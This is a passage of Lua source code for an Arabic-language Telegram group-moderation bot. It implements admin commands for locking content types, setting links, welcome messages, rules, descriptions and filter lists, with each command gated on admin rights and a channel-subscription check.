local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Markdaun"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الماركداون").lockKtm,"md",true)  
return false
end 
if text == "قفل الماركداون بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Markdaun"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الماركداون").lockKick,"md",true)  
return false
end 
if text == "فتح الماركداون" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Markdaun"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الماركداون").unLock,"md",true)  
return false
end 
if text == "قفل الجهات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Contact"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الجهات").Lock,"md",true)  
return false
end 
if text == "قفل الجهات بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Contact"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الجهات").lockKid,"md",true)  
return false
end 
if text == "قفل الجهات بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Contact"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الجهات").lockKtm,"md",true)  
return false
end 
if text == "قفل الجهات بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Contact"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الجهات").lockKick,"md",true)  
return false
end 
if text == "فتح الجهات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Contact"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الجهات").unLock,"md",true)  
return false
end 
if text == "قفل الكلايش" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Spam"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكلايش").Lock,"md",true)  
return false
end 
if text == "قفل الكلايش بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Spam"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكلايش").lockKid,"md",true)  
return false
end 
if text == "قفل الكلايش بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Spam"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكلايش").lockKtm,"md",true)  
return false
end 
if text == "قفل الكلايش بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Spam"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكلايش").lockKick,"md",true)  
return false
end 
if text == "فتح الكلايش" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Spam"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الكلايش").unLock,"md",true)  
return false
end 
if text == "قفل الانلاين" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Inlen"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الانلاين").Lock,"md",true)  
return false
end 
if text == "قفل الانلاين بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Inlen"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الانلاين").lockKid,"md",true)  
return false
end 
if text == "قفل الانلاين بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Inlen"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الانلاين").lockKtm,"md",true)  
return false
end 
if text == "قفل الانلاين بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Inlen"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الانلاين").lockKick,"md",true)  
return false
end 
if text == "فتح الانلاين" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Inlen"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الانلاين").unLock,"md",true)  
return false
end 
if text == "ضع رابط" or text == "وضع رابط" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Set:Link"..msg_chat_id..""..msg.sender.user_id,120,true) 
return send(msg_chat_id,msg_id,"٭ ارسل رابط الكروب او رابط قناة الكروب","md",true)  
end
if text == "مسح الرابط" or text == "حذف الرابط" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Group:Link"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم مسح الرابط ","md",true)             
end
if text == "الرابط" then
if not Redis:get(darket.."Status:Link"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل جلب الرابط من قبل الادمنيه","md",true)
end 
local Get_Chat = LuaTele.getChat(msg_chat_id)
local GetLink = Redis:get(darket.."Group:Link"..msg_chat_id) 
if GetLink then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text =Get_Chat.title, url = GetLink}, },}}
return send(msg_chat_id, msg_id, "٠Link Group : \n["..Get_Chat.title.. ']('..GetLink..')', 'md', true, false, false, false, reply_markup)
else 
local LinkGroup = LuaTele.generateChatInviteLink(msg_chat_id,'Hussain',tonumber(msg.date+86400),0,true)
if LinkGroup.code == 3 then
return send(msg_chat_id,msg_id,"٠ لا استطيع جلب الرابط بسبب ليس لدي صلاحيه دعوه مستخدمين من خلال الرابط ","md",true)
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = Get_Chat.title, url = LinkGroup.invite_link},},}}
return send(msg_chat_id, msg_id, "٠Link Group : \n["..Get_Chat.title.. ']('..LinkGroup.invite_link..')', 'md', true, false, false, false, reply_markup)
end
end

if text == "ضع ترحيب" or text == "وضع ترحيب" then  
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id, 120, true)  
return send(msg_chat_id,msg_id,"٠ ارسل لي الترحيب الان".."\n٠تستطيع اضافة مايلي !\n٠دالة عرض الاسم ٠{`name`}\n٠دالة عرض المعرف ٠{`user`}\n٠دالة عرض اسم الكروب ٠{`NameCh`}","md",true)   
end
if text == "الترحيب" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:get(darket.."Status:Welcome"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل الترحيب من قبل الادمنيه","md",true)
end 
local Welcome = Redis:get(darket.."Welcome:Group"..msg_chat_id)
if Welcome then 
return send(msg_chat_id,msg_id,Welcome,"md",true)   
else 
return send(msg_chat_id,msg_id,"٠ لم يتم تعيين ترحيب للكروب","md",true)   
end 
end
if text == "مسح الترحيب" or text == "حذف الترحيب" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Welcome:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم ازالة ترحيب الكروب","md",true)   
end
if text == "ضع قوانين" or text == "وضع قوانين" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
return send(msg_chat_id,msg_id,"٠ ارسل لي القوانين الان","md",true)  
end
if text == "مسح القوانين" or text == "حذف القوانين" then  
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Group:Rules"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم ازالة قوانين الكروب","md",true)    
end
if text == "القوانين" then 
local Rules = Redis:get(darket.."Group:Rules" .. msg_chat_id)   
if Rules then     
return send(msg_chat_id,msg_id,Rules,"md",true)     
else      
return send(msg_chat_id,msg_id,"٠ لا توجد قوانين هنا","md",true)     
end    
end
if text == "ضع وصف" or text == "وضع وصف" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).Info == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
Redis:setex(darket.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
return send(msg_chat_id,msg_id,"٠ ارسل لي وصف الكروب الان","md",true)  
end
if text == "مسح الوصف" or text == "حذف الوصف" then  
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).Info == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
LuaTele.setChatDescription(msg_chat_id, '') 
return send(msg_chat_id,msg_id,"٠ تم ازالة قوانين الكروب","md",true)    
end

if text and text:match("^ضع اسم (.*)") or text and text:match("^وضع اسم (.*)") then 
local NameChat = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).Info == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
LuaTele.setChatTitle(msg_chat_id,NameChat)
return send(msg_chat_id,msg_id,"٠ تم تغيير اسم الكروب الى : "..NameChat,"md",true)    
end

if text == ("ضع صوره") then  
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Info == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
Redis:set(darket.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id,true) 
return send(msg_chat_id,msg_id,"٠ ارسل الصوره لوضعها","md",true)    
end

if text == "مسح قائمه المنع" then   
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Filter"..msg_chat_id)  
if #list == 0 then  
return send(msg_chat_id,msg_id,"*٠ لا يوجد كلمات ممنوعه هنا *","md",true)   
end  
for k,v in pairs(list) do  
v = v:gsub('photo:',"") 
v = v:gsub('sticker:',"") 
v = v:gsub('animation:',"") 
v = v:gsub('text:',"") 
Redis:del(darket.."Filter:Group:"..v..msg_chat_id)  
Redis:srem(darket.."List:Filter"..msg_chat_id,v)  
end  
return send(msg_chat_id,msg_id,"*٠ تم مسح ("..#list..") كلمات ممنوعه *","md",true)   
end
if text == "قائمه المنع" then   
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Filter"..msg_chat_id)  
if #list == 0 then  
return send(msg_chat_id,msg_id,"*٠ لا يوجد كلمات ممنوعه هنا *","md",true)   
end  
Filter = '\n*٠ قائمه المنع \n – – – – – – – –*\n'
for k,v in pairs(list) do  
print(v)
if v:match('photo:(.*)') then
ver = 'صوره'
elseif v:match('animation:(.*)') then
ver = 'متحركه'
elseif v:match('sticker:(.*)') then
ver = 'ملصق'
elseif v:match('text:(.*)') then
ver = v:gsub('text:',"") 
end
v = v:gsub('photo:',"") 
v = v:gsub('sticker:',"") 
v = v:gsub('animation:',"") 
v = v:gsub('text:',"") 
local Text_Filter = Redis:get(darket.."Filter:Group:"..v..msg_chat_id)   
Filter = Filter.."*"..k.."- "..ver.." ٠ { "..Text_Filter.." }*\n"    
end  
send(msg_chat_id,msg_id,Filter,"md",true)  
end  
if text == "منع" then       
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'true')
return send(msg_chat_id,msg_id,'\n*٠ ارسل الان { ملصق ,متحركه ,صوره ,رساله } *',"md",true)  
end    
if text == "الغاء منع" then    
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'DelFilter')
return send(msg_chat_id,msg_id,'\n*٠ ارسل الان { ملصق ,متحركه ,صوره ,رساله } *',"md",true)  
end

if text == "اضف امر عام" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
return send(msg_chat_id,msg_id,"٠الان ارسل لي الامر القديم ...","md",true)
end
if text == "حذف امر عام" or text == "مسح امر عام" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
return send(msg_chat_id,msg_id,"٠ ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
end
if text == "حذف الاوامر المضافه العامه" or text == "مسح الاوامر المضافه العامه" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."All:Command:List:Group")
for k,v in pairs(list) do
Redis:del(darket.."All:Get:Reides:Commands:Group"..v)
Redis:del(darket.."All:Command:List:Group")
end
return send(msg_chat_id,msg_id,"٠ تم مسح جميع الاوامر التي تم اضافتها في العام","md",true)
end
if text == "الاوامر المضافه العامه" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
